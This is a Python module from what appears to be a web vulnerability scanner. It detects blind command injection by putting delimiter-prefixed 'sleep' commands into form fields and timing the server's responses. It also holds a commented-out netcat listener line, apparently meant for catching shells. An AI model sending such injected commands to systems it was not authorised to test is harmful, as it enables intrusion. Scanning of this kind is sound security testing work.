from Injection import *
from threading import Thread
# Python Program to Get IP Address
import socket   
import os

class BlindCmdInjection(Injection):
    def __init__(self, session, payloadPath, urls, threshold, port=8088):
        super().__init__(session, urls, "Blind Cmd Injection")
        if payloadPath:
            self.payloads = self.Get_payloads(payloadPath)
        else : 
            self.payloads  = self.Get_payloads('payload/bcmdi_min.txt')
        self.threshold = threshold
        #self.ip = socket.gethostbyname(socket.gethostname()) 
        #self.port = port

    def CheckFault(self, start, end, random_time):

        t_time = end - start  
        return t_time > random_time and t_time < random_time + self.threshold

    def PayloadInjection(self, params, selected_input, url, href, formMethod):
        params_dict = {}
        for i in range(len(params)):
            params_dict[params.loc[i, 'name']] = params.loc[i, 'value']

        random_time = random.uniform(10, 20)
        delimiters = [';', '&&', '|']
        for delm in delimiters:
            payload = delm + 'sleep ' + str(random_time)
            params_dict[params.loc[selected_input, 'name']] = payload
            start = time.time() 
            response_html_doc = self.send_request(href, params_dict, formMethod)
            end = time.time()
            fault = self.CheckFault(start, end, random_time)
            if fault: 
                self.PrintErr("Blind Command Injection", href, params.loc[selected_input, 'name'], payload)
                return True
        #Thread(target = os.system('nc -vv -l -p ' + str(self.port))).start() 
        return False
